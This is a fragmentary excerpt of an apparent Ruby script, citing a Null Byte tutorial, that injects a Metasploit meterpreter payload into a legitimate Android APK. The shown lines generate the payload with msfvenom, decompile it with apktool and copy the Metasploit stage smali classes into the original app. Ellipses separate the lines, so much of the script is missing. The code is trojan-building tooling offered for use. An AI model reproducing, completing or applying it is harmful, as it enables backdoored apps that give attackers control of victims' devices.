...
# Source: https://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-0166901/
...
puts "Metasploit command: msfvenom -f raw #{opts} -o payload.apk 2>&1\n"
...
#`apktool d $(pwd)/Insert/meterpreter.apk -o $(pwd)/payload`
...
puts "[*] Launcheractivity: #{launcheractivity} "
...
FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/*.smali'), 'original/smali/com/metasploit/stage/'
